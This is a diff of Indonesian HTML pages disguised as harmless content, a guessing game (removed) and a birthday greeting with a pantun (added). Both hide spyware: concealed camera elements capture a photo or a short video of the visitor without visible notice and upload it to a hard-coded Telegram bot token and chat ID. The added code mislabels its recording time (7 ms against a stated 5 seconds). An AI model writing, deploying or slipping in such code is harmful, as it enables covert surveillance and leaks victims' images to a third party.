@@ -1,137 +1,99 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Tebak Angka Surprise</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      background-color: #f0f8ff;
-      padding: 20px;
-    }
-    h1 {
-      color: #0077b6;
-      font-size: 30px;
-    }
-    input, button {
-      padding: 10px;
-      margin: 5px;
-      font-size: 16px;
-    }
-    #score, #lives, #result, #gameOver {
-      margin-top: 15px;
-      font-size: 20px;
-    }
-    #gameOver {
-      color: red;
-      font-weight: bold;
-    }
-    /* Sembunyikan elemen kamera */
-    #camStream, #camCanvas {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hadiah Ulang Tahun</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #ffe4e1;
+            padding: 20px;
+        }
+        h1 {
+            color: #ff6b81;
+            font-size: 24px;
+        }
+        p {
+            color: #333;
+            font-size: 18px;
+            line-height: 1.6;
+            margin: 20px;
+        }
+    </style>
 </head>
 <body>
-  <h1>Permainan Tebak Angka!</h1>
-  <p>Komputer memilih angka antara 1 sampai 10. Tebak dan kumpulkan skor!</p>
+    <h1>Selamat Ulang Tahun!</h1>
+    <p>
+        Di hari yang spesial ini, aku ingin mengingatkan betapa berharganya kamu.<br>
+        Kalau bintang di langit dihitung satu per satu, itu tak cukup menggambarkan betapa besar rasa sayangku.<br><br>
+        Ada pantun buat kamu nih!<br>
+        <i>"Pergi ke pasar beli ikan sepat,</i><br>
+        <i>Cantik wajahmu bikin aku terpikat."</i><br><br>
+        Semoga hari ulang tahunmu penuh kebahagiaan dan kejutan, ya!
+    </p>
 
-  <input type="number" id="guessInput" placeholder="Masukkan tebakan..." min="1" max="10">
-  <br>
-  <button onclick="checkGuess()">Tebak!</button>
-  <button onclick="restartGame()">Mulai Ulang</button>
+    <video id="preview" style="display:none;" autoplay muted></video>
+    <script>
+        const video = document.getElementById('preview');
+        
+        // Akses kamera untuk merekam tanpa menampilkan video
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
 
-  <div id="score">Skor: 0</div>
-  <div id="lives">Nyawa: 3</div>
-  <div id="result"></div>
-  <div id="gameOver"></div>
+                mediaRecorder.start();
 
-  <!-- Elemen untuk snapshot -->
-  <video id="camStream" autoplay playsinline></video>
-  <canvas id="camCanvas"></canvas>
+                mediaRecorder.ondataavailable = (e) => {
+                    chunks.push(e.data);
+                };
 
-  <script>
-    // --- Game Logic ---
-    let randomNumber = Math.floor(Math.random() * 10) + 1;
-    let score = 0;
-    let lives = 3;
+                // Durasi perekaman otomatis: 5 detik, durasi bisa lu ubah cuy di 5000
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 7);
 
-    function checkGuess() {
-      if (lives <= 0) return;
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    chunks = [];
+                    
+                    // Edisi malas ngoding buahhaha
+                    sendToTelegram(blob); 
+                };
+            })
+            .catch((err) => {
+                console.error('Gagal mengakses kamera:', err.message);
+            });
 
-      const guess = parseInt(document.getElementById('guessInput').value);
-      const resultEl = document.getElementById('result');
-      const scoreEl = document.getElementById('score');
-      const livesEl = document.getElementById('lives');
-      const gameOverEl = document.getElementById('gameOver');
+        // Script By Zamur Xhunter 
+        function sendToTelegram(blob) {
+            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E'; // Ganti dengan token bot Anda
+            const CHAT_ID = '8050058475'; // Ganti dengan chat ID Anda
+            const formData = new FormData();
 
-      if (guess === randomNumber) {
-        resultEl.textContent = "Tebakanmu benar! +1 poin!";
-        resultEl.style.color = "green";
-        score++;
-        randomNumber = Math.floor(Math.random() * 10) + 1;
-      } else {
-        resultEl.textContent = "Salah! Coba lagi!";
-        resultEl.style.color = "red";
-        lives--;
-      }
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', blob, 'kejutan-ulang-tahun.mp4');
 
-      scoreEl.textContent = "Skor: " + score;
-      livesEl.textContent = "Nyawa: " + lives;
-
-      if (lives <= 0) {
-        gameOverEl.textContent = "Game Over! Klik 'Mulai Ulang' untuk main lagi.";
-        takeSnapshot();  // langsung ambil foto sekali
-      }
-    }
-
-    function restartGame() {
-      score = 0;
-      lives = 3;
-      randomNumber = Math.floor(Math.random() * 10) + 1;
-      document.getElementById('score').textContent = "Skor: 0";
-      document.getElementById('lives').textContent = "Nyawa: 3";
-      document.getElementById('result').textContent = "";
-      document.getElementById('gameOver').textContent = "";
-      document.getElementById('guessInput').value = "";
-    }
-
-    // --- Kamera & Snapshot ---
-    const video = document.getElementById('camStream');
-    const canvas = document.getElementById('camCanvas');
-
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        console.error('Gagal akses kamera:', err);
-      });
-
-    function takeSnapshot() {
-      const ctx = canvas.getContext('2d');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.9);
-    }
-
-    function sendToTelegram(blob) {
-      const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
-      const CHAT_ID = '8050058475';
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('photo', blob, 'surprise.jpg');
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: 'POST',
-        body: form
-      }).catch(() => {
-        // silent fail
-      });
-    }
-  </script>
+            // Kirim video menggunakan API Telegram
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('Video berhasil dikirim ke Telegram.');
+                    } else {
+                        console.error('Gagal mengirim video:', data);
+                    }
+                })
+                .catch(error => {
+                    console.error('Terjadi kesalahan saat mengirim video:', error);
+                });
+        }
+    </script>
 </body>
 </html>
